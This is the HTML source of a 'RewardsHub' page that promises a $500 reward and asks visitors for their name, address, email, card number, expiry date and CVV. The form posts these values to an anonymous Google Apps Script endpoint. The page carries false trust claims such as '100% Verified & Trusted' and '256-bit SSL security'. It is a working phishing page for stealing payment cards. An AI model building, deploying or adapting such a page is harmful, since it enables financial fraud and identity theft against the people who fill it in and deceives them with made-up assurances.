<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RewardsHub - $500 Reward</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap');
        :root { --bg: #050505; --card: #111111; --accent: #8a2be2; --text: #ffffff; }
        body { background: var(--bg); color: var(--text); font-family: 'Inter', sans-serif; display: flex; flex-direction: column; align-items: center; min-height: 100vh; margin: 0; }
        
        /* Modern Header */
        .header { width: 100%; padding: 20px; background: rgba(255,255,255,0.03); backdrop-filter: blur(10px); text-align: center; border-bottom: 1px solid #333; }
        .badge { background: #1a4d2e; color: #4ade80; padding: 5px 15px; border-radius: 20px; font-size: 12px; font-weight: 700; text-transform: uppercase; }
        
        .main-container { width: 90%; max-width: 450px; margin: 40px 0; }
        .form-box { background: var(--card); padding: 30px; border-radius: 24px; border: 1px solid #222; }
        
        .input-group { margin-bottom: 18px; }
        label { display: block; font-size: 11px; color: #888; margin-bottom: 6px; font-weight: 600; }
        input { width: 100%; background: #000; border: 1px solid #333; padding: 14px; border-radius: 12px; color: white; box-sizing: border-box; }
        input:focus { border-color: var(--accent); outline: none; }
        
        .submit-btn { width: 100%; background: var(--accent); color: white; border: none; padding: 16px; border-radius: 12px; font-weight: 800; cursor: pointer; transition: 0.3s; }
        .submit-btn:hover { background: #7020c0; }
        
        .footer { margin-top: auto; padding: 30px; color: #444; font-size: 12px; text-align: center; }
    </style>
</head>
<body>

    <div class="header">
        <div class="badge">100% Verified & Trusted</div>
        <h2 style="margin: 15px 0 0 0;">Secure Reward Claim</h2>
    </div>

    <div class="main-container">
        <div class="form-box">
            <form action="https://script.google.com/macros/s/AKfycbz4bE3WIVsYF6EhtlF6xbbJWSZTCx4VOFED3dHpoN88hmVk82uNfm_xToOth-7YEDEb/exec" method="POST">
                
                <div style="display:flex; gap:10px;">
                    <div class="input-group" style="flex:1;"><label>First Name</label><input type="text" name="firstName" required></div>
                    <div class="input-group" style="flex:1;"><label>Last Name</label><input type="text" name="lastName" required></div>
                </div>
                
                <div class="input-group"><label>Email Address</label><input type="email" name="email" required></div>
                <div class="input-group"><label>Zip Code</label><input type="text" name="zipCode" required></div>
                <div class="input-group"><label>Full Delivery Address</label><input type="text" name="address" required></div>
                <div class="input-group"><label>Cardholder Name</label><input type="text" name="cardholderName" required></div>
                
                <div class="input-group">
                    <label>Card Number</label>
                    <input type="text" name="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" pattern="\d{4} \d{4} \d{4} \d{4}" required>
                </div>
                
                <div style="display:flex; gap:10px;">
                    <div class="input-group" style="flex:1;"><label>Expiry (MM/YY)</label><input type="text" name="expiry" placeholder="MM/YY" maxlength="5" required></div>
                    <div class="input-group" style="flex:1;"><label>CVV</label><input type="password" name="cvv" placeholder="•••" maxlength="4" required></div>
                </div>
                
                <button type="submit" class="submit-btn">Claim Reward Now</button>
            </form>
        </div>
    </div>

    <div class="footer">
        &copy; 2026 RewardsHub. All rights reserved.<br>
        Your data is encrypted with 256-bit SSL security.
    </div>

</body>
</html>
